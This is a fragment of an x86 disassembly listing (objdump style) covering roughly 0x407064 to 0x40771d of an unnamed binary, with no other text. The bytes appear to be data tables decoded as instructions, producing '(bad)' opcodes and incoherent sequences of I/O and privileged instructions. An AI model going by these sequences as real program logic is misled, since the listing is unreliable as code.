  407064:	42                   	inc    %edx
  407065:	02 09                	add    (%ecx),%cl
  407067:	03 03                	add    (%ebx),%eax
  407069:	15 6b 01 09 03       	adc    $0x309016b,%eax
  40706e:	5c                   	pop    %esp
  40706f:	19 6a 05             	sbb    %ebp,0x5(%edx)
  407072:	11 03                	adc    %eax,(%ebx)
  407074:	eb 14                	jmp    0x40708a
  407076:	70 05                	jo     0x40707d
  407078:	19 03                	sbb    %eax,(%ebx)
  40707a:	ec                   	in     (%dx),%al
  40707b:	1a 76 05             	sbb    0x5(%esi),%dh
  40707e:	21 03                	and    %eax,(%ebx)
  407080:	cc                   	int3
  407081:	0f 7c                	(bad)
  407083:	05 c1 01 08 1a       	add    $0x1a0801c1,%eax
  407088:	47                   	inc    %edi
  407089:	02 19                	add    (%ecx),%bl
  40708b:	03 d8                	add    %eax,%ebx
  40708d:	1b bf 01 81 02 c8    	sbb    -0x37fd7eff(%edi),%edi
  407093:	05 86 05 29 03       	add    $0x3290586,%eax
  407098:	6e                   	outsb  %ds:(%esi),(%dx)
  407099:	00 f4                	add    %dh,%ah
  40709b:	01 59 01             	add    %ebx,0x1(%ecx)
  40709e:	4d                   	dec    %ebp
  40709f:	1b 7b 00             	sbb    0x0(%ebx),%edi
  4070a2:	59                   	pop    %ecx
  4070a3:	01 75 07             	add    %esi,0x7(%ebp)
  4070a6:	c3                   	ret
  4070a7:	00 59 01             	add    %bl,0x1(%ecx)
  4070aa:	37                   	aaa
  4070ab:	07                   	pop    %es
  4070ac:	c3                   	ret
  4070ad:	00 59 01             	add    %bl,0x1(%ecx)
  4070b0:	fb                   	sti
  4070b1:	10 93 05 c1 01 bf    	adc    %dl,-0x40fe3efb(%ebx)
  4070b7:	18 99 05 49 03 03    	sbb    %bl,0x3034905(%ecx)
  4070bd:	15 0e 00 61 01       	adc    $0x161000e,%eax
  4070c2:	52                   	push   %edx
  4070c3:	02 cd                	add    %ch,%cl
  4070c5:	03 51 03             	add    0x3(%ecx),%edx
  4070c8:	14 0d                	adc    $0xd,%al
  4070ca:	75 01                	jne    0x4070cd
  4070cc:	69 00 03 15 0e 00    	imul   $0xe1503,(%eax),%eax
  4070d2:	21 02                	and    %eax,(%edx)
  4070d4:	61                   	popa
  4070d5:	0c 70                	or     $0x70,%al
  4070d7:	01 69 00             	add    %ebp,0x0(%ecx)
  4070da:	c9                   	leave
  4070db:	04 aa                	add    $0xaa,%al
  4070dd:	05 c1 01 c5 0c       	add    $0xcc501c1,%eax
  4070e2:	b0 05                	mov    $0x5,%al
  4070e4:	c1 01 45             	roll   $0x45,(%ecx)
  4070e7:	14 47                	adc    $0x47,%al
  4070e9:	02 c1                	add    %cl,%al
  4070eb:	01 e2                	add    %esp,%edx
  4070ed:	04 bd                	add    $0xbd,%al
  4070ef:	05 59 01 d5 0f       	add    $0xfd50159,%eax
  4070f4:	1d 00 61 03 61       	sbb    $0x61036100,%eax
  4070f9:	0c 47                	or     $0x47,%al
  4070fb:	02 69 03             	add    0x3(%ecx),%ch
  4070fe:	43                   	inc    %ebx
  4070ff:	0d c3 00 b1 02       	or     $0x2b100c3,%eax
  407104:	b0 07                	mov    $0x7,%al
  407106:	c3                   	ret
  407107:	05 59 03 c2 07       	add    $0x7c20359,%eax
  40710c:	c3                   	ret
  40710d:	05 59 03 61 0c       	add    $0xc610359,%eax
  407112:	47                   	inc    %edi
  407113:	02 71 03             	add    0x3(%ecx),%dh
  407116:	f8                   	clc
  407117:	1a c9                	sbb    %cl,%cl
  407119:	05 79 03 03 15       	add    $0x15030379,%eax
  40711e:	cf                   	iret
  40711f:	05 79 03 71 06       	add    $0x6710379,%eax
  407124:	d6                   	salc
  407125:	05 c1 00 5e 08       	add    $0x85e00c1,%eax
  40712a:	0e                   	push   %cs
  40712b:	00 19                	add    %bl,(%ecx)
  40712d:	00 5e 08             	add    %bl,0x8(%esi)
  407130:	0e                   	push   %cs
  407131:	00 09                	add    %cl,(%ecx)
  407133:	03 03                	add    (%ebx),%eax
  407135:	15 36 02 0c 00       	adc    $0xc0236,%eax
  40713a:	03 15 0e 00 0c 00    	add    0xc000e,%edx
  407140:	22 03                	and    (%ebx),%al
  407142:	f5                   	cmc
  407143:	05 0c 00 43 1b       	add    $0x1b43000c,%eax
  407148:	f4                   	hlt
  407149:	01 0c 00             	add    %ecx,(%eax,%eax,1)
  40714c:	74 1c                	je     0x40716a
  40714e:	fb                   	sti
  40714f:	05 c1 01 da 10       	add    $0x10da01c1,%eax
  407154:	01 06                	add    %eax,(%esi)
  407156:	51                   	push   %ecx
  407157:	00 f0                	add    %dh,%al
  407159:	17                   	pop    %ss
  40715a:	11 06                	adc    %eax,(%esi)
  40715c:	51                   	push   %ecx
  40715d:	00 f4                	add    %dh,%ah
  40715f:	01 17                	add    %edx,(%edi)
  407161:	06                   	push   %es
  407162:	59                   	pop    %ecx
  407163:	00 6b 03             	add    %ch,0x3(%ebx)
  407166:	17                   	pop    %ss
  407167:	06                   	push   %es
  407168:	89 03                	mov    %eax,(%ebx)
  40716a:	6d                   	insl   (%dx),%es:(%edi)
  40716b:	1d 1d 06 69 00       	sbb    $0x69061d,%eax
  407170:	03 15 01 03 61 00    	add    0x610301,%edx
  407176:	03 15 2d 06 91 03    	add    0x391062d,%edx
  40717c:	5e                   	pop    %esi
  40717d:	08 0e                	or     %cl,(%esi)
  40717f:	00 99 03 03 15 56    	add    %bl,0x56150303(%ecx)
  407185:	04 a1                	add    $0xa1,%al
  407187:	03 b0 0b 35 06 81    	add    -0x7ef9caf5(%eax),%esi
  40718d:	02 17                	add    (%edi),%dl
  40718f:	05 0a 00 91 02       	add    $0x291000a,%eax
  407194:	a3 1c 35 05 91       	mov    %eax,0x9105351c
  407199:	02 b8 0a 43 06 89    	add    -0x76f9bcf6(%eax),%bh
  40719f:	01 79 05             	add    %edi,0x5(%ecx)
  4071a2:	47                   	inc    %edi
  4071a3:	02 91 02 a3 1c 54    	add    0x541ca302(%ecx),%dl
  4071a9:	06                   	push   %es
  4071aa:	91                   	xchg   %eax,%ecx
  4071ab:	02 af 0a 7c 05 91    	add    -0x6efa83f6(%edi),%ch
  4071b1:	02 98 0a 6b 01 91    	add    -0x6efe94f6(%eax),%bl
  4071b7:	02 bd 1c 5e 06 91    	add    -0x6ef9a1e4(%ebp),%bh
  4071bd:	02 68 05             	add    0x5(%eax),%ch
  4071c0:	6b 01 1c             	imul   $0x1c,(%ecx),%eax
  4071c3:	00 22                	add    %ah,(%edx)
  4071c5:	03 f5                	add    %ebp,%esi
  4071c7:	05 b9 03 ac 1b       	add    $0x1bac03b9,%eax
  4071cc:	7c 06                	jl     0x4071d4
  4071ce:	1c 00                	sbb    $0x0,%al
  4071d0:	eb 14                	jmp    0x4071e6
  4071d2:	92                   	xchg   %eax,%edx
  4071d3:	06                   	push   %es
  4071d4:	24 00                	and    $0x0,%al
  4071d6:	ec                   	in     (%dx),%al
  4071d7:	1a a4 06 1c 00 e3 0a 	sbb    0xae3001c(%esi,%eax,1),%ah
  4071de:	a9 06 24 00 d8       	test   $0xd8002406,%eax
  4071e3:	1b bf 01 c9 03 b7    	sbb    -0x48fc36ff(%edi),%edi
  4071e9:	10 b3 06 c9 03 18    	adc    %dh,0x1803c906(%ebx)
  4071ef:	03 b9 06 d1 03 25    	add    0x2503d106(%ecx),%edi
  4071f5:	08 c1                	or     %al,%cl
  4071f7:	06                   	push   %es
  4071f8:	e1 03                	loope  0x4071fd
  4071fa:	ea 04 c8 06 d9 03 08 	ljmp   $0x803,$0xd906c804
  407201:	06                   	push   %es
  407202:	cf                   	iret
  407203:	06                   	push   %es
  407204:	f1                   	int1
  407205:	03 b3 08 d8 06 01    	add    0x106d808(%ebx),%esi
  40720b:	04 d3                	add    $0xd3,%al
  40720d:	12 e2                	adc    %dl,%ah
  40720f:	06                   	push   %es
  407210:	2c 00                	sub    $0x0,%al
  407212:	b3 08                	mov    $0x8,%bl
  407214:	17                   	pop    %ss
  407215:	07                   	pop    %es
  407216:	2c 00                	sub    $0x0,%al
  407218:	6f                   	outsl  %ds:(%esi),(%dx)
  407219:	19 23                	sbb    %esp,(%ebx)
  40721b:	07                   	pop    %es
  40721c:	34 00                	xor    $0x0,%al
  40721e:	95                   	xchg   %eax,%ebp
  40721f:	05 3b 07 1c 00       	add    $0x1c073b,%eax
  407224:	03 15 0e 00 c1 01    	add    0x1c1000e,%edx
  40722a:	ab                   	stos   %eax,%es:(%edi)
  40722b:	1d 84 00 21 04       	sbb    $0x4210084,%eax
  407230:	03 15 6b 01 19 04    	add    0x419016b,%edx
  407236:	03 15 59 07 29 04    	add    0x4290759,%edx
  40723c:	b7 16                	mov    $0x16,%bh
  40723e:	61                   	popa
  40723f:	07                   	pop    %es
  407240:	51                   	push   %ecx
  407241:	01 2c 0c             	add    %ebp,(%esp,%ecx,1)
  407244:	93                   	xchg   %eax,%ebx
  407245:	01 49 04             	add    %ecx,0x4(%ecx)
  407248:	03 15 6b 01 59 02    	add    0x259016b,%edx
  40724e:	03 15 0e 00 31 04    	add    0x431000e,%edx
  407254:	03 15 0e 00 51 04    	add    0x451000e,%edx
  40725a:	58                   	pop    %eax
  40725b:	0b 01                	or     (%ecx),%eax
  40725d:	03 51 04             	add    0x4(%ecx),%edx
  407260:	f5                   	cmc
  407261:	0a 01                	or     (%ecx),%al
  407263:	03 51 04             	add    0x4(%ecx),%edx
  407266:	f9                   	stc
  407267:	04 7a                	add    $0x7a,%al
  407269:	07                   	pop    %es
  40726a:	51                   	push   %ecx
  40726b:	04 a4                	add    $0xa4,%al
  40726d:	0b 81 07 51 04 9b    	or     -0x64fbaef9(%ecx),%eax
  407273:	1c 2b                	sbb    $0x2b,%al
  407275:	02 51 04             	add    0x4(%ecx),%dl
  407278:	8c 02                	mov    %es,(%edx)
  40727a:	0e                   	push   %cs
  40727b:	00 51 04             	add    %dl,0x4(%ecx)
  40727e:	28 15 88 07 39 04    	sub    %dl,0x4390788
  407284:	03 15 8e 07 51 04    	add    0x451078e,%edx
  40728a:	7e 02                	jle    0x40728e
  40728c:	31 02                	xor    %eax,(%edx)
  40728e:	39 04 47             	cmp    %eax,(%edi,%eax,2)
  407291:	0e                   	push   %cs
  407292:	0e                   	push   %cs
  407293:	00 41 04             	add    %al,0x4(%ecx)
  407296:	03 15 2b 02 59 02    	add    0x259022b,%edx
  40729c:	74 1c                	je     0x4072ba
  40729e:	31 02                	xor    %eax,(%edx)
  4072a0:	51                   	push   %ecx
  4072a1:	03 14 0d 9a 07 79 04 	add    0x479079a(,%ecx,1),%edx
  4072a8:	03 15 6b 01 51 04    	add    0x451016b,%edx
  4072ae:	85 02                	test   %eax,(%edx)
  4072b0:	2b 02                	sub    (%edx),%eax
  4072b2:	51                   	push   %ecx
  4072b3:	04 18                	add    $0x18,%al
  4072b5:	15 88 07 c1 00       	adc    $0xc10788,%eax
  4072ba:	78 0d                	js     0x4072c9
  4072bc:	23 02                	and    (%edx),%eax
  4072be:	81 04 2e 1d be 07 91 	addl   $0x9107be1d,(%esi,%ebp,1)
  4072c5:	04 57                	add    $0x57,%al
  4072c7:	1c d0                	sbb    $0xd0,%al
  4072c9:	07                   	pop    %es
  4072ca:	a1 04 03 15 0e       	mov    0xe150304,%eax
  4072cf:	00 c1                	add    %al,%cl
  4072d1:	01 cb                	add    %ecx,%ebx
  4072d3:	18 f9                	sbb    %bh,%cl
  4072d5:	07                   	pop    %es
  4072d6:	49                   	dec    %ecx
  4072d7:	02 b7 16 99 01 49    	add    0x49019916(%edi),%dh
  4072dd:	02 b7 16 ab 01 a9    	add    -0x56fe54ea(%edi),%dh
  4072e3:	00 03                	add    %al,(%ebx)
  4072e5:	15 0e 00 1c 00       	adc    $0x1c000e,%eax
  4072ea:	cc                   	int3
  4072eb:	0f 06                	clts
  4072ed:	08 1c 00             	or     %bl,(%eax,%eax,1)
  4072f0:	43                   	inc    %ebx
  4072f1:	1b f4                	sbb    %esp,%esi
  4072f3:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  4072f6:	c8 12 0e 00          	enter  $0xe12,$0x0
  4072fa:	c1 01 74             	roll   $0x74,(%ecx)
  4072fd:	17                   	pop    %ss
  4072fe:	42                   	inc    %edx
  4072ff:	02 c1                	add    %cl,%al
  407301:	00 8e 0a 28 08 49    	add    %cl,0x4908280a(%esi)
  407307:	02 b7 16 a5 01 51    	add    0x5101a516(%edi),%dh
  40730d:	01 ad 00 32 08 c1    	add    %ebp,-0x3ef7ce00(%ebp)
  407313:	01 36                	add    %esi,(%esi)
  407315:	10 47 02             	adc    %al,0x2(%edi)
  407318:	a9 04 6c 08 37       	test   $0x37086c04,%eax
  40731d:	08 51 01             	or     %dl,0x1(%ecx)
  407320:	ad                   	lods   %ds:(%esi),%eax
  407321:	00 3c 08             	add    %bh,(%eax,%ecx,1)
  407324:	51                   	push   %ecx
  407325:	01 ad 00 41 08 51    	add    %ebp,0x51084100(%ebp)
  40732b:	01 ad 00 46 08 51    	add    %ebp,0x51084600(%ebp)
  407331:	01 ce                	add    %ecx,%esi
  407333:	00 4d 08             	add    %cl,0x8(%ebp)
  407336:	41                   	inc    %ecx
  407337:	03 6c 08 52          	add    0x52(%eax,%ecx,1),%ebp
  40733b:	08 51 01             	or     %dl,0x1(%ecx)
  40733e:	ce                   	into
  40733f:	00 57 08             	add    %dl,0x8(%edi)
  407342:	51                   	push   %ecx
  407343:	01 ce                	add    %ecx,%esi
  407345:	00 5c 08 51          	add    %bl,0x51(%eax,%ecx,1)
  407349:	01 ce                	add    %ecx,%esi
  40734b:	00 61 08             	add    %ah,0x8(%ecx)
  40734e:	51                   	push   %ecx
  40734f:	01 b4 05 68 08 b1 04 	add    %esi,0x4b10868(%ebp,%eax,1)
  407356:	6c                   	insb   (%dx),%es:(%edi)
  407357:	08 6d 08             	or     %ch,0x8(%ebp)
  40735a:	49                   	dec    %ecx
  40735b:	02 b7 16 7a 08 59    	add    0x59087a16(%edi),%dh
  407361:	03 44 1d 23          	add    0x23(%ebp,%ebx,1),%eax
  407365:	02 e1                	add    %cl,%ah
  407367:	02 03                	add    (%ebx),%al
  407369:	15 88 08 c1 00       	adc    $0xc10888,%eax
  40736e:	85 0a                	test   %ecx,(%edx)
  407370:	f4                   	hlt
  407371:	01 89 01 03 15 6b    	add    %ecx,0x6b150301(%ecx)
  407377:	01 49 02             	add    %ecx,0x2(%ecx)
  40737a:	e0 00                	loopne 0x40737c
  40737c:	b6 08                	mov    $0x8,%dh
  40737e:	49                   	dec    %ecx
  40737f:	02 31                	add    (%ecx),%dh
  407381:	06                   	push   %es
  407382:	bd 08 49 02 b4       	mov    $0xb4024908,%ebp
  407387:	05 c4 08 49 02       	add    $0x24908c4,%eax
  40738c:	65 00 cb             	gs add %cl,%bl
  40738f:	08 49 02             	or     %cl,0x2(%ecx)
  407392:	ad                   	lods   %ds:(%esi),%eax
  407393:	00 d2                	add    %dl,%dl
  407395:	08 49 02             	or     %cl,0x2(%ecx)
  407398:	e9 00 d9 08 49       	jmp    0x49494c9d
  40739d:	02 ce                	add    %dh,%cl
  40739f:	00 e0                	add    %ah,%al
  4073a1:	08 49 02             	or     %cl,0x2(%ecx)
  4073a4:	b7 16                	mov    $0x16,%bh
  4073a6:	12 09                	adc    (%ecx),%cl
  4073a8:	d1 04 03             	roll   $1,(%ebx,%eax,1)
  4073ab:	15 28 09 09 00       	adc    $0x90928,%eax
  4073b0:	80 00 0d             	addb   $0xd,(%eax)
  4073b3:	01 09                	add    %ecx,(%ecx)
  4073b5:	00 84 00 12 01 09 00 	add    %al,0x90112(%eax,%eax,1)
  4073bc:	88 00                	mov    %al,(%eax)
  4073be:	17                   	pop    %ss
  4073bf:	01 08                	add    %ecx,(%eax)
  4073c1:	00 98 00 5c 01 08    	add    %bl,0x8015c00(%eax)
  4073c7:	00 9c 00 61 01 08 00 	add    %bl,0x80161(%eax,%eax,1)
  4073ce:	a0 00 66 01 08       	mov    0x8016600,%al
  4073d3:	00 a4 00 5c 01 08 00 	add    %ah,0x8015c(%eax,%eax,1)
  4073da:	ec                   	in     (%dx),%al
  4073db:	00 7f 02             	add    %bh,0x2(%edi)
  4073de:	08 00                	or     %al,(%eax)
  4073e0:	f0 00 17             	lock add %dl,(%edi)
  4073e3:	01 08                	add    %ecx,(%eax)
  4073e5:	00 f4                	add    %dh,%ah
  4073e7:	00 12                	add    %dl,(%edx)
  4073e9:	01 08                	add    %ecx,(%eax)
  4073eb:	00 f8                	add    %bh,%al
  4073ed:	00 84 02 08 00 fc 00 	add    %al,0xfc0008(%edx,%eax,1)
  4073f4:	89 02                	mov    %eax,(%edx)
  4073f6:	08 00                	or     %al,(%eax)
  4073f8:	00 01                	add    %al,(%ecx)
  4073fa:	8e 02                	mov    (%edx),%es
  4073fc:	08 00                	or     %al,(%eax)
  4073fe:	04 01                	add    $0x1,%al
  407400:	93                   	xchg   %eax,%ebx
  407401:	02 08                	add    (%eax),%cl
  407403:	00 08                	add    %cl,(%eax)
  407405:	01 98 02 08 00 0c    	add    %ebx,0xc000802(%eax)
  40740b:	01 9d 02 08 00 10    	add    %ebx,0x10000802(%ebp)
  407411:	01 a2 02 08 00 14    	add    %esp,0x14000802(%edx)
  407417:	01 a7 02 08 00 18    	add    %esp,0x18000802(%edi)
  40741d:	01 ac 02 2e 00 2b 00 	add    %ebp,0x2b002e(%edx,%eax,1)
  407424:	06                   	push   %es
  407425:	03 2e                	add    (%esi),%ebp
  407427:	00 33                	add    %dh,(%ebx)
  407429:	00 0f                	add    %cl,(%edi)
  40742b:	03 2e                	add    (%esi),%ebp
  40742d:	00 3b                	add    %bh,(%ebx)
  40742f:	00 34 03             	add    %dh,(%ebx,%eax,1)
  407432:	2e 00 43 00          	add    %al,%cs:0x0(%ebx)
  407436:	3d 03 2e 00 4b       	cmp    $0x4b002e03,%eax
  40743b:	00 3d 03 2e 00 53    	add    %bh,0x53002e03
  407441:	00 3d 03 2e 00 5b    	add    %bh,0x5b002e03
  407447:	00 3d 03 2e 00 63    	add    %bh,0x63002e03
  40744d:	00 3d 03 2e 00 6b    	add    %bh,0x6b002e03
  407453:	00 3d 03 2e 00 73    	add    %bh,0x73002e03
  407459:	00 3d 03 2e 00 7b    	add    %bh,0x7b002e03
  40745f:	00 43 03             	add    %al,0x3(%ebx)
  407462:	2e 00 83 00 50 03 2e 	add    %al,%cs:0x2e035000(%ebx)
  407469:	00 8b 00 3d 03 c0    	add    %cl,-0x3ffcc300(%ebx)
  40746f:	00 93 00 17 01 e0    	add    %dl,-0x1ffee900(%ebx)
  407475:	00 93 00 17 01 00    	add    %dl,0x11700(%ebx)
  40747b:	01 93 00 17 01 20    	add    %edx,0x20011700(%ebx)
  407481:	01 93 00 17 01 40    	add    %edx,0x40011700(%ebx)
  407487:	01 93 00 17 01 60    	add    %edx,0x60011700(%ebx)
  40748d:	01 93 00 17 01 80    	add    %edx,-0x7ffee900(%ebx)
  407493:	01 93 00 17 01 a0    	add    %edx,-0x5ffee900(%ebx)
  407499:	01 93 00 17 01 c0    	add    %edx,-0x3ffee900(%ebx)
  40749f:	01 93 00 17 01 e0    	add    %edx,-0x1ffee900(%ebx)
  4074a5:	01 93 00 17 01 00    	add    %edx,0x11700(%ebx)
  4074ab:	02 93 00 17 01 03    	add    0x3011700(%ebx),%dl
  4074b1:	02 93 00 17 01 20    	add    0x20011700(%ebx),%dl
  4074b7:	02 93 00 17 01 40    	add    0x40011700(%ebx),%dl
  4074bd:	02 93 00 17 01 60    	add    0x60011700(%ebx),%dl
  4074c3:	02 93 00 17 01 61    	add    0x61011700(%ebx),%dl
  4074c9:	02 93 00 17 01 63    	add    0x63011700(%ebx),%dl
  4074cf:	02 93 00 17 01 80    	add    -0x7ffee900(%ebx),%dl
  4074d5:	02 93 00 17 01 81    	add    -0x7efee900(%ebx),%dl
  4074db:	02 93 00 17 01 a0    	add    -0x5ffee900(%ebx),%dl
  4074e1:	02 93 00 17 01 a1    	add    -0x5efee900(%ebx),%dl
  4074e7:	02 93 00 17 01 c0    	add    -0x3ffee900(%ebx),%dl
  4074ed:	02 93 00 17 01 c1    	add    -0x3efee900(%ebx),%dl
  4074f3:	02 93 00 17 01 e0    	add    -0x1ffee900(%ebx),%dl
  4074f9:	02 93 00 17 01 e1    	add    -0x1efee900(%ebx),%dl
  4074ff:	02 93 00 17 01 e3    	add    -0x1cfee900(%ebx),%dl
  407505:	02 9b 00 b6 03 00    	add    0x3b600(%ebx),%bl
  40750b:	03 93 00 17 01 01    	add    0x1011700(%ebx),%edx
  407511:	03 93 00 17 01 20    	add    0x20011700(%ebx),%edx
  407517:	03 93 00 17 01 21    	add    0x21011700(%ebx),%edx
  40751d:	03 93 00 17 01 40    	add    0x40011700(%ebx),%edx
  407523:	03 93 00 17 01 41    	add    0x41011700(%ebx),%edx
  407529:	03 93 00 17 01 61    	add    0x61011700(%ebx),%edx
  40752f:	03 93 00 17 01 81    	add    -0x7efee900(%ebx),%edx
  407535:	03 93 00 17 01 a1    	add    -0x5efee900(%ebx),%edx
  40753b:	03 93 00 17 01 a3    	add    -0x5cfee900(%ebx),%edx
  407541:	03 93 00 17 01 01    	add    0x1011700(%ebx),%edx
  407547:	00 20                	add    %ah,(%eax)
  407549:	00 00                	add    %al,(%eax)
  40754b:	00 14 00             	add    %dl,(%eax,%eax,1)
  40754e:	01 00                	add    %eax,(%eax)
  407550:	06                   	push   %es
  407551:	00 00                	add    %al,(%eax)
  407553:	00 1e                	add    %bl,(%esi)
  407555:	00 c0                	add    %al,%al
  407557:	03 c9                	add    %ecx,%ecx
  407559:	03 f4                	add    %esp,%esi
  40755b:	03 9c 04 c2 04 e6 04 	add    0x4e604c2(%esp,%eax,1),%ebx
  407562:	54                   	push   %esp
  407563:	05 59 05 81 05       	add    $0x5810559,%eax
  407568:	8a 05 8f 05 9f 05    	mov    0x59f058f,%al
  40756e:	b6 05                	mov    $0x5,%dh
  407570:	dd 05 08 06 27 06    	fldl   0x6270608
  407576:	3c 06                	cmp    $0x6,%al
  407578:	4c                   	dec    %esp
  407579:	06                   	push   %es
  40757a:	66 06                	pushw  %es
  40757c:	af                   	scas   %es:(%edi),%eax
  40757d:	06                   	push   %es
  40757e:	53                   	push   %ebx
  40757f:	07                   	pop    %es
  407580:	67 07                	addr16 pop %es
  407582:	a3 07 cb 07 da       	mov    %eax,0xda07cb07
  407587:	07                   	pop    %es
  407588:	e8 07 f0 07 ff       	call   0xff486594
  40758d:	07                   	pop    %es
  40758e:	0c 08                	or     $0x8,%al
  407590:	11 08                	adc    %ecx,(%eax)
  407592:	20 08                	and    %cl,(%eax)
  407594:	2d 08 72 08 80       	sub    $0x80087208,%eax
  407599:	08 96 08 a2 08 a8    	or     %dl,-0x57f75df8(%esi)
  40759f:	08 ae 08 e7 08 f1    	or     %ch,-0xef718f8(%esi)
  4075a5:	08 f7                	or     %dh,%bh
  4075a7:	08 fc                	or     %bh,%ah
  4075a9:	08 02                	or     %al,(%edx)
  4075ab:	09 0b                	or     %ecx,(%ebx)
  4075ad:	09 18                	or     %ebx,(%eax)
  4075af:	09 31                	or     %esi,(%ecx)
  4075b1:	09 04 00             	or     %eax,(%eax,%eax,1)
  4075b4:	01 00                	add    %eax,(%eax)
  4075b6:	16                   	push   %ss
  4075b7:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4075ba:	17                   	pop    %ss
  4075bb:	00 0d 00 18 00 0f    	add    %cl,0xf001800
  4075c1:	00 00                	add    %al,(%eax)
  4075c3:	00 62 1a             	add    %ah,0x1a(%edx)
  4075c6:	9f                   	lahf
  4075c7:	00 00                	add    %al,(%eax)
  4075c9:	00 46 1a             	add    %al,0x1a(%esi)
  4075cc:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4075cd:	00 00                	add    %al,(%eax)
  4075cf:	00 9f 13 a9 00 00    	add    %bl,0xa913(%edi)
  4075d5:	00 24 0b             	add    %ah,(%ebx,%ecx,1)
  4075d8:	ae                   	scas   %es:(%edi),%al
  4075d9:	00 00                	add    %al,(%eax)
  4075db:	00 dc                	add    %bl,%ah
  4075dd:	19 ae 00 00 00 d9    	sbb    %ebp,-0x27000000(%esi)
  4075e3:	0a b2 00 00 00 56    	or     0x56000000(%edx),%dh
  4075e9:	03 b7 00 00 00 f6    	add    -0xa000000(%edi),%esi
  4075ef:	02 bb 00 00 00 8e    	add    -0x72000000(%ebx),%bh
  4075f5:	0b b2 00 00 00 f8    	or     -0x8000000(%edx),%esi
  4075fb:	0e                   	push   %cs
  4075fc:	bf 00 00 00 f3       	mov    $0xf3000000,%edi
  407601:	0c b7                	or     $0xb7,%al
  407603:	00 00                	add    %al,(%eax)
  407605:	00 a6 1a c3 01 00    	add    %ah,0x1c31a(%esi)
  40760b:	00 d0                	add    %dl,%al
  40760d:	0f f8 01             	psubb  (%ecx),%mm0
  407610:	00 00                	add    %al,(%eax)
  407612:	93                   	xchg   %eax,%ebx
  407613:	0d fe 01 00 00       	or     $0x1fe,%eax
  407618:	a1 0c 69 02 00       	mov    0x2690c,%eax
  40761d:	00 df                	add    %bl,%bh
  40761f:	13 6d 02             	adc    0x2(%ebp),%ebp
  407622:	00 00                	add    %al,(%eax)
  407624:	0a 19                	or     (%ecx),%bl
  407626:	71 02                	jno    0x40762a
  407628:	00 00                	add    %al,(%eax)
  40762a:	8b 1c 75 02 00 00 f8 	mov    -0x7fffffe(,%esi,2),%ebx
  407631:	07                   	pop    %es
  407632:	7a 02                	jp     0x407636
  407634:	02 00                	add    (%eax),%al
  407636:	06                   	push   %es
  407637:	00 03                	add    %al,(%ebx)
  407639:	00 01                	add    %al,(%ecx)
  40763b:	00 07                	add    %al,(%edi)
  40763d:	00 03                	add    %al,(%ebx)
  40763f:	00 02                	add    %al,(%edx)
  407641:	00 08                	add    %cl,(%eax)
  407643:	00 05 00 01 00 09    	add    %al,0x9000100
  407649:	00 05 00 02 00 0a    	add    %al,0xa000200
  40764f:	00 07                	add    %al,(%edi)
  407651:	00 01                	add    %al,(%ecx)
  407653:	00 0b                	add    %cl,(%ebx)
  407655:	00 07                	add    %al,(%edi)
  407657:	00 02                	add    %al,(%edx)
  407659:	00 0c 00             	add    %cl,(%eax,%eax,1)
  40765c:	09 00                	or     %eax,(%eax)
  40765e:	01 00                	add    %eax,(%eax)
  407660:	0d 00 09 00 02       	or     $0x2000900,%eax
  407665:	00 0e                	add    %cl,(%esi)
  407667:	00 0b                	add    %cl,(%ebx)
  407669:	00 01                	add    %al,(%ecx)
  40766b:	00 0f                	add    %cl,(%edi)
  40766d:	00 0b                	add    %cl,(%ebx)
  40766f:	00 02                	add    %al,(%edx)
  407671:	00 10                	add    %dl,(%eax)
  407673:	00 0d 00 01 00 11    	add    %cl,0x11000100
  407679:	00 0d 00 02 00 12    	add    %cl,0x12000200
  40767f:	00 0f                	add    %cl,(%edi)
  407681:	00 01                	add    %al,(%ecx)
  407683:	00 13                	add    %dl,(%ebx)
  407685:	00 0f                	add    %cl,(%edi)
  407687:	00 02                	add    %al,(%edx)
  407689:	00 14 00             	add    %dl,(%eax,%eax,1)
  40768c:	11 00                	adc    %eax,(%eax)
  40768e:	02 00                	add    (%eax),%al
  407690:	15 00 13 00 01       	adc    $0x1001300,%eax
  407695:	00 16                	add    %dl,(%esi)
  407697:	00 13                	add    %dl,(%ebx)
  407699:	00 02                	add    %al,(%edx)
  40769b:	00 17                	add    %dl,(%edi)
  40769d:	00 15 00 01 00 18    	add    %dl,0x18000100
  4076a3:	00 15 00 02 00 19    	add    %dl,0x19000200
  4076a9:	00 17                	add    %dl,(%edi)
  4076ab:	00 01                	add    %al,(%ecx)
  4076ad:	00 1a                	add    %bl,(%edx)
  4076af:	00 17                	add    %dl,(%edi)
  4076b1:	00 02                	add    %al,(%edx)
  4076b3:	00 60 00             	add    %ah,0x0(%eax)
  4076b6:	19 00                	sbb    %eax,(%eax)
  4076b8:	02 00                	add    (%eax),%al
  4076ba:	68 00 1b 00 02       	push   $0x2001b00
  4076bf:	00 69 00             	add    %ch,0x0(%ecx)
  4076c2:	1d 00 02 00 8b       	sbb    $0x8b000200,%eax
  4076c7:	00 1f                	add    %bl,(%edi)
  4076c9:	00 01                	add    %al,(%ecx)
  4076cb:	00 8c 00 1f 00 02 00 	add    %cl,0x2001f(%eax,%eax,1)
  4076d2:	8d 00                	lea    (%eax),%eax
  4076d4:	21 00                	and    %eax,(%eax)
  4076d6:	01 00                	add    %eax,(%eax)
  4076d8:	8e 00                	mov    (%eax),%es
  4076da:	21 00                	and    %eax,(%eax)
  4076dc:	02 00                	add    (%eax),%al
  4076de:	8f 00                	pop    (%eax)
  4076e0:	23 00                	and    (%eax),%eax
  4076e2:	01 00                	add    %eax,(%eax)
  4076e4:	90                   	nop
  4076e5:	00 23                	add    %ah,(%ebx)
  4076e7:	00 02                	add    %al,(%edx)
  4076e9:	00 91 00 25 00 02    	add    %dl,0x2002500(%ecx)
  4076ef:	00 92 00 27 00 16    	add    %dl,0x16002700(%edx)
  4076f5:	00 c0                	add    %al,%al
  4076f7:	00 03                	add    %al,(%ebx)
  4076f9:	00 16                	add    %dl,(%esi)
  4076fb:	00 c2                	add    %al,%dl
  4076fd:	00 05 00 16 00 c4    	add    %al,0xc4001600
  407703:	00 07                	add    %al,(%edi)
  407705:	00 18                	add    %bl,(%eax)
  407707:	00 26                	add    %ah,(%esi)
  407709:	01 09                	add    %ecx,(%ecx)
  40770b:	00 1d 0f 10 0f 28    	add    %bl,0x280f100f
  407711:	0f ef 05 5b 06 75 06 	pxor   0x675065b,%mm0
  407718:	9c                   	pushf
  407719:	06                   	push   %es
  40771a:	ff 06                	incl   (%esi)
  40771c:	27                   	daa
  40771d:	07                   	pop    %es
